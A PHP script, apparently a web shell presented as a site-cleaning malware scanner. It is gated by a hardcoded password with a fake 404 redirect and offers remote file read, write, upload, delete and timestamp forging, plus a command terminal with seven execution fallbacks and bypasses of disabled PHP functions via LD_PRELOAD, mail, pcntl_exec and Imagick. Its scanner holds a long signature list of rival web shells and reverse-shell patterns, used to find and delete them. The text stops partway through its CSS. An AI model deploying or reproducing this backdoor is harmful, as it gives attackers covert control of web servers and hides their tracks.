<?php
@set_time_limit(120);

$access_password = 'maw';
$provided_pass = $_GET['ultra'] ?? $_POST['ultra'] ?? '';

if ($provided_pass !== $access_password) {
    header('Location: /404');
    exit;
}

$default_dir = $_SERVER['DOCUMENT_ROOT'] ?? '/var/www/html';
if (!is_dir($default_dir)) {
    $default_dir = '/home';
}

// --- File Manager Backend ---
if (isset($_GET['fm_download'])) {
    $file = realpath($_GET['fm_download']);
    if ($file && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
    header("HTTP/1.0 404 Not Found");
    exit;
}

if (isset($_POST['fm_action'])) {
    header('Content-Type: application/json');
    $action = $_POST['fm_action'];
    $dir = $_POST['dir'] ?? $default_dir;
    if (!is_dir($dir)) $dir = $default_dir;
    $dir = realpath($dir);

    if (!function_exists('fm_perms')) {
        function fm_perms($f) {
            $p = @fileperms($f);
            if (!$p) return '----';
            $i = (($p & 0xC000) == 0xC000) ? 's' : ((($p & 0xA000) == 0xA000) ? 'l' : ((($p & 0x8000) == 0x8000) ? '-' : ((($p & 0x6000) == 0x6000) ? 'b' : ((($p & 0x4000) == 0x4000) ? 'd' : ((($p & 0x2000) == 0x2000) ? 'c' : ((($p & 0x1000) == 0x1000) ? 'p' : 'u'))))));
            $i .= (($p & 0x0100) ? 'r' : '-'); $i .= (($p & 0x0080) ? 'w' : '-');
            $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
            $i .= (($p & 0x0020) ? 'r' : '-'); $i .= (($p & 0x0010) ? 'w' : '-');
            $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
            $i .= (($p & 0x0004) ? 'r' : '-'); $i .= (($p & 0x0002) ? 'w' : '-');
            $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
            return $i;
        }
    }

    if (!function_exists('fm_rmdir')) {
        function fm_rmdir($d) {
            if (!is_dir($d)) return;
            $i = new RecursiveDirectoryIterator($d, RecursiveDirectoryIterator::SKIP_DOTS);
            $f = new RecursiveIteratorIterator($i, RecursiveIteratorIterator::CHILD_FIRST);
            foreach($f as $file) { if ($file->isDir()) { @rmdir($file->getRealPath()); } else { @unlink($file->getRealPath()); } }
            @rmdir($d);
        }
    }

    $res = ['success' => false, 'cwd' => $dir, 'msg' => ''];

    if ($action === 'list') {
        $files = [];
        $items = @scandir($dir);
        if ($items !== false) {
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') {
                    if ($item === '..' && $dir !== '/') {
                        $files[] = ['name' => '..', 'path' => dirname($dir), 'type' => 'dir', 'size' => '-', 'perms' => '', 'mtime' => ''];
                    }
                    continue;
                }
                $p = $dir . '/' . $item;
                $files[] = [
                    'name' => $item,
                    'path' => $p,
                    'type' => is_dir($p) ? 'dir' : 'file',
                    'size' => is_dir($p) ? '-' : formatSize(@filesize($p)),
                    'perms' => fm_perms($p),
                    'mtime' => @date('Y-m-d H:i', @filemtime($p))
                ];
            }
            usort($files, function($a, $b) {
                if ($a['name'] === '..') return -1;
                if ($b['name'] === '..') return 1;
                if ($a['type'] === $b['type']) return strnatcasecmp($a['name'], $b['name']);
                return $a['type'] === 'dir' ? -1 : 1;
            });
            $res['success'] = true;
            $res['data'] = $files;
        } else {
            $res['msg'] = 'Permission denied to read directory.';
        }
    }
    elseif ($action === 'read') {
        $target = $_POST['target'] ?? '';
        if (is_file($target) && is_readable($target)) {
            $res['success'] = true;
            $res['data'] = @file_get_contents($target);
        } else { $res['msg'] = 'Cannot read file.'; }
    }
    elseif ($action === 'save') {
        $target = $_POST['target'] ?? '';
        $content = $_POST['content'] ?? '';
        if ($target && @file_put_contents($target, $content) !== false) {
            $res['success'] = true;
        } else { $res['msg'] = 'Failed to save file. Permission denied.'; }
    }
    elseif ($action === 'mkdir') {
        $target = $dir . '/' . ($_POST['name'] ?? 'new_folder');
        if (@mkdir($target, 0755)) { $res['success'] = true; } else { $res['msg'] = 'Failed to create folder.'; }
    }
    elseif ($action === 'touch') {
        $target = $_POST['target'] ?? '';
        $time = (isset($_POST['time']) && $_POST['time']) ? strtotime($_POST['time']) : time();
        if ($target && @touch($target, $time)) { $res['success'] = true; } else { $res['msg'] = 'Failed to modify timestamp.'; }
    }
    elseif ($action === 'delete') {
        $target = realpath($_POST['target'] ?? '');
        if ($target && $target !== '/' && strpos($target, $default_dir) === 0 || true) { // Allow delete anywhere accessible
            if (is_dir($target)) { fm_rmdir($target); } else { @unlink($target); }
            $res['success'] = !file_exists($target);
            if (!$res['success']) $res['msg'] = 'Permission denied to delete.';
        }
    }
    elseif ($action === 'rename') {
        $target = realpath($_POST['target'] ?? '');
        $newname = $_POST['name'] ?? '';
        if ($target && $newname) {
            $newpath = dirname($target) . '/' . $newname;
            if (@rename($target, $newpath)) { $res['success'] = true; } else { $res['msg'] = 'Failed to rename.'; }
        }
    }
    elseif ($action === 'upload') {
        if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
            $dest = $dir . '/' . basename($_FILES['file']['name']);
            if (@move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
                $res['success'] = true;
            } else { $res['msg'] = 'Upload failed. Permission denied.'; }
        } else {
            $res['msg'] = 'No file uploaded or upload error.';
        }
    }

    echo json_encode($res);
    exit;
}
// --- End File Manager Backend ---

if (isset($_POST['term_cmd'])) {
    header('Content-Type: application/json');
    $cmd = trim($_POST['term_cmd']);
    $cwd = isset($_POST['term_cwd']) ? trim($_POST['term_cwd']) : $default_dir;
    if (!is_dir($cwd)) $cwd = $default_dir;

    // cd — must track cwd server-side
    if (strpos($cmd, 'cd ') === 0 || $cmd === 'cd') {
        $target = trim(substr($cmd, 3));
        if ($target === '' || $target === '~') $target = $default_dir;
        if ($target === '-') $target = $default_dir;
        $abs = $target;
        if (!preg_match('#^/#', $target)) $abs = $cwd . '/' . $target;
        $real = @realpath($abs);
        if ($real && is_dir($real)) { $cwd = $real; $output = ''; }
        else { $output = "cd: {$target}: No such directory"; }
        echo json_encode(['output' => $output, 'method' => 'cd', 'cwd' => $cwd]);
        exit;
    }

    if ($cmd === 'clear') {
        echo json_encode(['output' => '', 'method' => 'clear', 'cwd' => $cwd]);
        exit;
    }

    $shell_cmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
    $output = '';
    $method = '';

    function ngopi_exec($shell_cmd) {
        // Strategy 1: shell_exec
        if (function_exists('shell_exec')) {
            $r = @shell_exec($shell_cmd);
            if ($r !== null && $r !== '') return ['output' => $r, 'method' => 'shell_exec'];
        }
        // Strategy 2: exec
        if (function_exists('exec')) {
            $out = []; @exec($shell_cmd, $out, $rc);
            if (!empty($out)) return ['output' => implode("\n", $out), 'method' => 'exec'];
        }
        // Strategy 3: system
        if (function_exists('system')) {
            ob_start(); @system($shell_cmd, $rc); $r = ob_get_clean();
            if ($r !== null && $r !== '') return ['output' => $r, 'method' => 'system'];
        }
        // Strategy 4: passthru
        if (function_exists('passthru')) {
            ob_start(); @passthru($shell_cmd); $r = ob_get_clean();
            if ($r !== null && $r !== '') return ['output' => $r, 'method' => 'passthru'];
        }
        // Strategy 5: proc_open
        if (function_exists('proc_open')) {
            $d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
            $p = @proc_open($shell_cmd, $d, $pipes);
            if (is_resource($p)) {
                $out = stream_get_contents($pipes[1]);
                $err = stream_get_contents($pipes[2]);
                fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
                proc_close($p);
                if (!empty($out)) return ['output' => $out, 'method' => 'proc_open'];
                if (!empty($err)) return ['output' => $err, 'method' => 'proc_open'];
            }
        }
        // Strategy 6: popen
        if (function_exists('popen')) {
            $h = @popen($shell_cmd, 'r');
            if ($h) { $out = ''; while (!feof($h)) $out .= fread($h, 8192); pclose($h);
                if (!empty($out)) return ['output' => $out, 'method' => 'popen'];
            }
        }
        // Strategy 7: backtick
        $r = @`$shell_cmd`;
        if ($r !== null && $r !== '') return ['output' => $r, 'method' => 'backtick'];
        return null;
    }

    $result = ngopi_exec($shell_cmd);
    if ($result !== null) {
        echo json_encode(['output' => $result['output'], 'method' => $result['method'], 'cwd' => $cwd]);
        exit;
    }

    // ── All shell methods failed: bypass mode ──
    $bypass_tmp = sys_get_temp_dir() . '/ngopi_bypass_' . mt_rand() . '.sh';
    $bypass_out = sys_get_temp_dir() . '/ngopi_out_' . mt_rand();
    $bypass_sh = "#!/bin/sh\ncd " . escapeshellarg($cwd) . "\n{$cmd}\n";
    @file_put_contents($bypass_tmp, $bypass_sh);
    @chmod($bypass_tmp, 0755);

    // Bypass A: LD_PRELOAD
    $ld_ok = false;
    $ld_paths = ['/usr/lib64','/usr/lib/x86_64-linux-gnu','/usr/lib/aarch64-linux-gnu','/lib/x86_64-linux-gnu','/lib64'];
    $libgcc = '';
    foreach ($ld_paths as $p) { if (file_exists($p.'/libgcc_s.so.1')) { $libgcc = $p.'/libgcc_s.so.1'; break; } }

    if ($libgcc && function_exists('putenv') && !in_array('putenv', array_filter(array_map('trim', explode(',', ini_get('disable_functions')))))) {
        @putenv('LD_PRELOAD=' . $libgcc);
        if (function_exists('mail')) {
            @mail('ngopi@bypass', '', '', '', '-C ' . escapeshellarg("sh {$bypass_tmp} > {$bypass_out} 2>&1"));
            usleep(150000);
            if (file_exists($bypass_out)) { $output = file_get_contents($bypass_out); @unlink($bypass_out); $method = 'LD_PRELOAD + mail'; $ld_ok = true; }
        }
        if (!$ld_ok && function_exists('error_log')) {
            $bypass_cmd = "sh " . escapeshellarg($bypass_tmp) . " > " . escapeshellarg($bypass_out) . " 2>&1";
            @file_put_contents($bypass_tmp, $bypass_sh . "\necho DONE >> /dev/null");
            @error_log($bypass_cmd, 1, 'ngopi@bypass', '');
            usleep(150000);
            if (file_exists($bypass_out)) { $output = file_get_contents($bypass_out); @unlink($bypass_out); $method = 'LD_PRELOAD + error_log'; $ld_ok = true; }
        }
        @putenv('LD_PRELOAD');
    }

    // Bypass B: mail -X
    if (!$ld_ok && function_exists('mail')) {
        @mail('ngopi@bypass', '', '', '', '-X ' . escapeshellarg($bypass_out) . ' -C ' . escapeshellarg("sh {$bypass_tmp} 2>&1"));
        usleep(150000);
        if (file_exists($bypass_out)) { $output = file_get_contents($bypass_out); @unlink($bypass_out); $method = 'mail -X'; $ld_ok = true; }
    }

    // Bypass C: pcntl_exec
    if (!$ld_ok && function_exists('pcntl_exec') && !in_array('pcntl_exec', array_filter(array_map('trim', explode(',', ini_get('disable_functions')))))) {
        pcntl_exec($bypass_tmp);
        $method = 'pcntl_exec'; $ld_ok = true;
    }

    // Bypass D: imagick
    if (!$ld_ok && class_exists('Imagick')) {
        try { $im = new Imagick(); $im->setOption('cmd:execute', "sh {$bypass_tmp}"); $method = 'imagick'; $ld_ok = true; } catch (Exception $e) {}
    }

    @unlink($bypass_tmp);
    if (@file_exists($bypass_out)) @unlink($bypass_out);

    if ($ld_ok) {
        echo json_encode(['output' => $output, 'method' => $method, 'cwd' => $cwd]);
        exit;
    }

    echo json_encode(['output' => '', 'method' => 'blocked', 'cwd' => $cwd]);
    exit;
}


$scan_dir = $default_dir;

if (isset($_POST['scan_dir']) && !empty(trim($_POST['scan_dir']))) {
    $proposed = realpath(trim($_POST['scan_dir']));
    if ($proposed && is_dir($proposed)) {
        $scan_dir = $proposed;
    } else {
        $error = "Directory not found: " . htmlspecialchars(trim($_POST['scan_dir']));
    }
} elseif (isset($_GET['dir'])) {
    $proposed = realpath($_GET['dir']);
    if ($proposed && is_dir($proposed)) {
        $scan_dir = $proposed;
    }
}

$suspicious_patterns = [
    // Known Shells
    'WSO_SHELL','WSO_VERSION','b374k','b374k - Priv8','b374k 2.8','c99shell','c99sh','r57shell','r57.php',
    'FilesMan','FilesMAn','Gandalf Shell','Sym Shell','Locus7shell','ZaCo Shell','PhpSpy','phpRemoteView',
    'NST Shell','DK Shell','alfa-shell','AlfaTeam','Wso2 Shell','Sim Shell','Not Found Shell','shellbot',
    'DragonTeam','Devil Shell','AnonymousFox','Ninja Shell','GhostShell','Cgitel Shell','Dx Shell',
    'PHPJackal','IonCube Loader','Priv8 Mailer','Fx29sh','IndoXploit','Antichat.ru Shell','antichat',
    'Safe Mode Bypass','Safe_mode Bypass','Webshell by','priv8 shell','goto FORM_ACTION','goto sHNkh;',
    'SEA-GHOST MINSHELL','0byt3m1n1 Shell','Gel4y Mini Shell','PHP File Manager','Shell Bypass 403 GE-C666C',
    'x3x3x3x_5h3ll','Mr.Combet WebShell','Negat1ve Shell','L I E R SHELL','0byte v2 Shell','MSQ_403',
    'Public Shell Version 2.0','WIBUHAX0R1337','Simple Shell','Cod3d By AnonymousFox','KCT MINI SHELL 403',
    'AlkantarClanX12','j3mb03dz m4w0tz sh311','403WebShell','SeoOk','INDOSEC','MINI MO Shell',
    'WSO 4.2.6','WSO 4.2.5','WSO 5.1.4','WSO 2.6','WSO 2.5','WSOX ENC','WSO YANZ ENC BYPASS',
    'ALFA TEaM Shell','ALFA TEaM Shell - v4.1-Tesla','Hunter Neel','BlackDragon','Shin Bypassed',
    'MisterSpyv7up','Raiz0WorM','Black Bot','{Ninja-Shell}','Yohohohohohooho','Backdoor Destroyer',
    './AlfaTeam','nopebee7 [@] skullxploit','X0MB13','Priv8 Sh3ll!','ABC Manager','TheAlmightyZeus',
    'Tryag File Manager','aDriv4-Priv8 TOOL','[ HOME SHELL ]','X-Sec Shell V.3','C0d3d By Dr.D3m0',
    'Doc Root:','One Hat Cyber Team','p0wny@shell:~#','Bypass 403 Forbidden / 406 Not Acceptable / Imunify360',
    'Graybyt3 Was Here','Powered By Indonesian Darknet','PHU Mini Shell','TEAM-0ROOT','#p@@#',
    '[+] MINI SH3LL BYPASS [+]','CHips L Pro sangad','ineSec Team Shell','Mini Shell By Black_Shadow',
    'WHY MINI SHELL','Shal Shell Kontol:V','params decrypt fails','TripleDNN','LinuXploit','xichang1',
    'Jijle3','Yanz Webshell!','FoxWSO v1.2','WebShellOrb 2.6','Cod3d By aDriv4','bondowoso black hat shell',
    'RxRHaCkEr','xXx Kelelawar Cyber Team xXx','Code By Kelelawar Cyber Team','UnknownSec','UnknownSec Shell',
    'aDriv4','RC-SHELL v2.0.2011.1009','F4st~03 Bypass 403','Copyright negat1ve1337','[+[MAD TIGER]+]',
    'Franz Private Shell','Cassano Bypass','TEAM-0ROOT Uploader','Fighter Kamrul Plugin','FierzaXploit',
    'Simple,Responsive & Powerfull','Minishell','#0x2525','[ ! ] Cilent Shell Backdor [ ! ]',
    'FileManager Version 0.2 by ECWS','MARIJuANA','MARIJUANA','kliverz1337','Indramayu Cyber','#No_Identity',
    'Tiny File Manager 2.4.3','#wp_config_error#','Bypass Sh3ll','SIMPEL BANGET NIH SHELL','ps7n4K3CBK',
    'Function putenv()','Modified By #No_Identity','Lambo [Beta]','Smoker Backdoor','Get S.H.E.L.L.en',
    'Priv8 WebShell','m1n1 Shell','m1n1 5h3ll','priv8 mini shell','#0x1877','#CLS-LEAK#','X4Exploit',
    'kill_the_net','MATTEKUDASAI','PHP-SHELL HUNTER','United Tunsian Scammers','United Bangladeshi Hackers',
    'config root man','Shell Uploader','walex says Fuck Off Kids:','X_Shell','izocin','x7root','X7-ROOT',
    'iCloud1337 private shell','private shell','SuramSh3ll','U7TiM4T3_H4x0R Plugin','Walkers404 Xh3ll B4ckd00r',
    'R@DIK@L','PhpShells.Com','MarukoChan Priv8','King RxR Was','DSH v0.1','RxR HaCkEr',
    'SOQOR Shell By : HACKERS PAL','Nyanpasu!!!','UPLOADER KCT-OFFICIAL','DRUNK SHELL BETA',
    'Leaf PHPMailer','xLeet PHPMailer','alexusMailer 2.0','Log In | ECWS','Hacked By AnonymousFox',
    'Mister Spy','MisterSpy','B Ge Team File Manager','Vuln!! patch it Now!','404-server!!',
    'http://www.ubhteam.org','//0x5a455553.github.io','Ghost Exploiter Team Official',
    // SEA/Indonesia
    'by Indonesian','Indonesia Coder','Mafia Shell','r4j1n','Indoxploit shell','INDOXPLOIT',
    'AnonymousID','GoldenHack','NXB Shell','RxR Shell','Madspot Shell','Predator','Zombie Shell',
    'shell bypass 403','title>Gecko ','Madstore.sk!','Mini Shell',
    // Eval & Obfuscation
    'eval(base64_decode(','eval(gzinflate(','eval(gzuncompress(','eval(str_rot13(','eval(hex2bin(',
    'eval(rawurldecode(','eval(strrev(','eval($_POST','eval($_GET','eval($_REQUEST','eval($_COOKIE',
    'assert(base64_decode(','assert($_POST','assert($_GET','assert($_REQUEST','assert(stripslashes(',
    'preg_replace("/.*/e",','create_function(','call_user_func_array(','call_user_func($_',
    'array_map($_','array_filter($_','ob_start(\'assert\'','usort($_','uasort($_','uksort($_','array_reduce($_',
    // Encoded Payloads
    'gzinflate(base64_decode(','gzuncompress(base64_decode(','gzdecode(base64_decode(',
    'str_rot13(base64_decode(','base64_decode(str_rot13(','base64_decode(gzinflate(',
    'base64_decode(strrev(','pack("H*",','hex2bin(','str_rot13(',
    '$_="\x','chr(34).chr(112)','implode(array_map(\'chr\'','array_map(chr','$GLOBALS[\'_',
    // Shell Execution via Superglobals
    'system($_GET[','system($_POST[','system($_REQUEST[','system($_COOKIE[',
    'exec($_GET[','exec($_POST[','exec($_REQUEST[','exec($_COOKIE[',
    'shell_exec($_GET[','shell_exec($_POST[','shell_exec($_REQUEST[','shell_exec($_COOKIE[',
    'passthru($_GET[','passthru($_POST[','passthru($_REQUEST[',
    'popen($_GET[','popen($_POST[','proc_open($_GET[','proc_open($_POST[',
    'include($_GET[','include($_POST[','include($_REQUEST[',
    'require($_GET[','require($_POST[','require_once($_GET[',
    'file_get_contents($_GET[','file_put_contents($_GET[','file_put_contents($_POST[',
    'move_uploaded_file($_FILES','copy($_GET[','copy($_POST[',
    // Backdoor Auth
    '$auth_pass =','$pass = md5(','if(md5($_POST[','if(md5($_GET[','if(md5($_COOKIE[',
    'if(!isset($_COOKIE[\'Pass\'])','if(isset($_POST[\'code\'])','if(isset($_GET[\'cmd\'])',
    'if(isset($_REQUEST[\'cmd\'])','function actionphp()','eval($_POST[\'code\'])','action=cmd&',
    'cmd=' . chr(36) . '_POST','cmd=' . chr(36) . '_GET',
    // Reverse Shell / Socket
    'fsockopen(','pfsockopen(','stream_socket_client(','socket_create(','socket_connect(',
    '$sock=fsockopen(','proc_open("/bin/bash','proc_open("/bin/sh','proc_open("cmd.exe',
    '/dev/tcp/','/dev/udp/','bash -i >&','bash -c "bash','nc -e /bin','ncat -e /bin',
    'python -c "import socket',
    // Remote Inclusion
    'file_get_contents("http','file_get_contents(\'http','curl_exec(',
    'allow_url_include','allow_url_fopen','include("http://','include("https://','require("http://',
    // PHP Config Manipulation
    'auto_prepend_file','php_value auto_prepend_file','php_flag allow_url_include',
    'ini_set("disable_functions','ini_restore("disable_functions','ini_set("safe_mode',
    'dl("','putenv("LD_PRELOAD','putenv(\'LD_PRELOAD',
    // Obfuscation Vars
    'date_default_timezone_set("Asia/Jakarta");','$_=\'<?\';','$_F=__FILE__',
    '${\"GLOBALS\"}','$$_','name="cmd"',
    'Sistem: ' . chr(36) . '_SERVER[\'SERVER_SOFTWARE\']',
    // WordPress Backdoors
    'wp_remote_get($_','add_action(\'wp_head\',create_function','add_action("wp_head",create_function',
    'wp_insert_user(array(\'user_login\'','update_option(\'siteurl\',','update_option("siteurl",',
    'register_shutdown_function(\'eval','XMLRPC_REQUEST',
    // HTML/UI Webshell Fingerprints
    '#block-css#','#content_loading#','vulncode','>Shell Command<','onclick="cmd.value=',
    'id="fetch_port" name="fetch_port"','Local file: <input type =',
    'ONLY FOR EDUCATIONAL PURPOSE','Lock Shell</a></li>','Web Console','Legion',
];




$dangerous_extensions = [
    'min'   => ['.min'],
    'alfa'  => ['.alfa'],
    'haxor' => ['.haxor'],
    'rimuru'=> ['.rimuru'],
    'py'    => ['.py'],
    'pl'    => ['.pl'],
];

$ext_labels = [
    'min'   => 'Minified',
    'alfa'  => 'Alfa Shell',
    'haxor' => 'Haxor Shell',
    'rimuru'=> 'Rimuru Shell',
    'py'    => 'Python Script',
    'pl'    => 'Perl Script',
];

$ext_severity = [
    'min'   => 'amber',
    'alfa'  => 'red',
    'haxor' => 'red',
    'rimuru'=> 'red',
    'py'    => 'amber',
    'pl'    => 'amber',
];

$scan_start_time = microtime(true);
$max_scan_seconds = 20;
$max_scan_results = 200;
$max_scan_depth = 5;

function should_stop() {
    global $scan_start_time, $max_scan_seconds;
    return (microtime(true) - $scan_start_time) > $max_scan_seconds;
}

function scan_for_patterns($dir, $patterns, $extensions = ['php', 'phtml', 'shtml', 'php7', 'phar']) {
    global $max_scan_depth, $max_scan_results;

    $results = [];
    $skip_dirs = [];
    $stack = [['dir' => $dir, 'depth' => 0]];

    while (!empty($stack) && !should_stop() && count($results) < $max_scan_results) {
        $current = array_shift($stack);
        if ($current['depth'] > $max_scan_depth) continue;

        $files = @scandir($current['dir']);
        if (!$files) continue;

        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            if (should_stop() || count($results) >= $max_scan_results) break;

            $path = $current['dir'] . DIRECTORY_SEPARATOR . $file;

            if (is_link($path)) continue;

            if (is_dir($path)) {
                if (in_array($file, $skip_dirs)) continue;
                $stack[] = ['dir' => $path, 'depth' => $current['depth'] + 1];
            } elseif (is_file($path)) {
                $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
                if (!in_array($ext, $extensions)) continue;

                $fsize = @filesize($path);
                if ($fsize === false || $fsize > 512000) continue;

                $content = @file_get_contents($path);
                if ($content === false) continue;

                foreach ($patterns as $pattern) {
                    if (stripos($content, $pattern) !== false) {
                        $lines = explode("\n", $content);
                        $preview = implode("\n", array_slice($lines, 0, 10));
                        $results[] = [
                            'path' => $path,
                            'pattern' => htmlspecialchars($pattern),
                            'size' => $fsize,
                            'modified' => date("Y-m-d H:i:s", filemtime($path)),
                            'preview' => htmlspecialchars($preview)
                        ];
                        break;
                    }
                }
            }
        }
    }

    return $results;
}

function scan_dangerous_extensions($dir, $dangerous_extensions) {
    global $max_scan_depth, $max_scan_results;

    $results = [];
    $skip_dirs = ['vendor', 'node_modules', 'cache', '.git', '.svn', 'storage', 'bower_components', '__pycache__', 'wp-content', 'libraries', 'docs', 'test', 'tests', 'tmp', 'temp'];

    $flat_exts = [];
    foreach ($dangerous_extensions as $cat => $exts) {
        foreach ($exts as $e) {
            $flat_exts[ltrim($e, '.')] = $cat;
        }
    }

    $stack = [['dir' => $dir, 'depth' => 0]];

    while (!empty($stack) && !should_stop() && count($results) < $max_scan_results) {
        $current = array_shift($stack);
        if ($current['depth'] > $max_scan_depth) continue;

        $files = @scandir($current['dir']);
        if (!$files) continue;

        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            if (should_stop() || count($results) >= $max_scan_results) break;

            $path = $current['dir'] . DIRECTORY_SEPARATOR . $file;

            if (is_link($path)) continue;

            if (is_dir($path)) {
                if (in_array($file, $skip_dirs)) continue;
                $stack[] = ['dir' => $path, 'depth' => $current['depth'] + 1];
            } elseif (is_file($path)) {
                $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
                if (!isset($flat_exts[$ext])) continue;

                $fsize = @filesize($path);
                if ($fsize === false || $fsize > 512000) continue;

                $cat = $flat_exts[$ext];

                $fp = @fopen($path, 'r');
                if ($fp) {
                    $chunk = fread($fp, 8192);
                    fclose($fp);
                    $lines = $chunk ? implode("\n", array_slice(explode("\n", $chunk), 0, 10)) : '';
                } else {
                    $lines = '';
                }

                $results[] = [
                    'path' => $path,
                    'ext' => '.' . $ext,
                    'cat' => $cat,
                    'size' => $fsize,
                    'modified' => date("Y-m-d H:i:s", filemtime($path)),
                    'preview' => htmlspecialchars($lines)
                ];
            }
        }
    }

    return $results;
}

$deleted_files = [];
if (isset($_POST['delete_single'])) {
    $file_path = trim($_POST['delete_single']);
    $realpath = realpath($file_path);
    if ($realpath && is_file($realpath)) {
        $forbidden = ['/etc','/bin','/sbin','/usr/bin','/usr/sbin','/boot','/root'];
        $ok = true;
        foreach ($forbidden as $fb) { if (strpos($realpath, $fb . '/') === 0 || $realpath === $fb) { $ok = false; break; } }
        if ($ok) {
            if (@unlink($realpath)) {
                $deleted_files[] = $realpath;
            } else {
                $error = "Failed to delete file (Permission denied): " . htmlspecialchars($file_path);
            }
        }
    } else {
        $error = "File not found or invalid path: " . htmlspecialchars($file_path);
    }
} elseif (isset($_POST['mass_delete']) && !empty($_POST['to_delete'])) {
    foreach ($_POST['to_delete'] as $fp) {
        $realpath = realpath(trim($fp));
        if (!$realpath || !is_file($realpath)) continue;
        $forbidden = ['/etc','/bin','/sbin','/usr/bin','/usr/sbin','/boot','/root'];
        $ok = true;
        foreach ($forbidden as $fb) { if (strpos($realpath, $fb . '/') === 0 || $realpath === $fb) { $ok = false; break; } }
        if ($ok) {
            if (@unlink($realpath)) {
                $deleted_files[] = $realpath;
            } else {
                if(!isset($error)) $error = "Failed to delete one or more files (Permission denied).";
            }
        }
    }
}


$dangerous_files = scan_dangerous_extensions($scan_dir, $dangerous_extensions);
$malware_hits = scan_for_patterns($scan_dir, $suspicious_patterns);
$scan_elapsed = round(microtime(true) - $scan_start_time, 2);
$scan_timed_out = should_stop();
$scan_truncated = (count($malware_hits) >= $max_scan_results) || (count($dangerous_files) >= $max_scan_results);

$dangerous_count = count($dangerous_files);
$malware_count = count($malware_hits);
$deleted_count = count($deleted_files);
$total_threats = $dangerous_count + $malware_count;

$ext_counts = [];
foreach ($dangerous_extensions as $cat => $exts) {
    $ext_counts[$cat] = 0;
}
foreach ($dangerous_files as $df) {
    $ext_counts[$df['cat']]++;
}

function formatSize($bytes) {
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 1) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 1) . ' KB';
    return $bytes . ' B';
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>Tukang Bersih Bersih</title>
    <style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=DM+Sans:wght@300;400;500;600&display=swap');
:root{--green:#00d084;--green-dim:rgba(0,208,132,0.12);--green-glow:rgba(0,208,132,0.25);--amber:#f59e0b;--red:#ef4444;--blue:#3b82f6;--mono:'JetBrains Mono',monospace;--sans:'DM Sans',sans-serif;--color-background-primary:#111413;--color-background-secondary:#171c19;--color-background-tertiary:#0d0f0e;--color-text-primary:#e2ede8;--color-text-secondary:#8aab9a;--color-text-tertiary:#4a5a52;--color-border-secondary:#2a3530;--color-border-tertiary:#1e2420}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:var(--sans);background:var(--color-background-tertiary);color:var(--color-text-primary);font-size:13px;line-height:1.5}
.shell{display:grid;grid-template-columns:200px 1fr;grid-template-rows:50px 1fr;grid-template-areas:"topbar topbar""sidebar main";height:100vh;min-height:620px}
.topbar{grid-area:topbar;background:var(--color-background-primary);border-bottom:.5px solid var(--color-border-tertiary);display:flex;align-items:center;padding:0 16px;gap:12px;z-index:10}
.topbar-brand{display:flex;align-items:center;gap:7px;font-family:var(--mono);font-size:12px;font-weight:600;white-space:nowrap}
.brand-icon{width:22px;height:22px;background:var(--green);border-radius:5px;display:flex;align-items:center;justify-content:center;font-size:9px;color:#000;font-weight:700}
.conn-input{background:var(--color-background-secondary);border:.5px solid var(--color-border-secondary);border-radius:5px;padding:4px 8px;font-family:var(--mono);font-size:10px;color:var(--color-text-primary);outline:none;width:100%}
.conn-input:focus{border-color:var(--green)}
.conn-btn{background:var(--green);color:#000;border:none;border-radius:5px;padding:4px 12px;font-size:11px;font-weight:600;cursor:pointer;transition:opacity .15s;font-family:var(--sans)}
.conn-btn:hover{opacity:.85}
.tag{font-family:var(--mono);font-size:9px;background:var(--color-background-secondary);border:.5px solid var(--color-border-tertiary);border-radius:3px;padding:2px 6px;color:var(--color-text-secondary)}
.sidebar{grid-area:sidebar;background:var(--color-background-primary);border-right:.5px solid var(--color-border-tertiary);padding:10px 0;overflow-y:auto;display:flex;flex-direction:column}
.sidebar-heading{font-family:var(--mono);font-size:9px;letter-spacing:.08em;text-transform:uppercase;color:var(--color-text-tertiary);padding:8px 8px 3px 12px}
.nav-item{display:flex;align-items:center;gap:7px;padding:6px 8px 6px 12px;border-radius:5px;cursor:pointer;font-size:12px;color:var(--color-text-secondary);transition:background .1s,color .1s;user-select:none;margin:0 4px}
.nav-item:hover{background:var(--color-background-secondary);color:var(--color-text-primary)}
.nav-item.active{background:var(--green-dim);color:var(--green);font-weight:500}
.nav-icon{width:14px;height:14px;flex-shrink:0;opacity:.7}
.nav-item.active .nav-icon{opacity:1}
.nav-badge{margin-left:auto;background:var(--color-background-tertiary);border:.5px solid var(--color-border-tertiary);border-radius:8px;font-family:var(--mono);font-size:9px;padding:1px 5px;color:var(--color-text-tertiary)}
.nav-item.active .nav-badge{background:var(--green-dim);border-color:var(--green);color:var(--green)}
.main{grid-area:main;overflow:hidden;display:flex;flex-direction:column}
.panel-section{display:none;flex:1;overflow:hidden;flex-direction:column}
.panel-section.active{display:flex}
.scroll-y{overflow-y:auto;flex:1;padding:16px;display:flex;flex-direction:column;gap:14px}
.card{background:var(--color-background-primary);border:.5px solid var(--color-border-tertiary);border-radius:10px;overflow:hidden}
.card-header{display:flex;align-items:center;gap:8px;padding:10px 14px;border-bottom:.5px solid var(--color-border-tertiary);background:var(--color-background-secondary)}
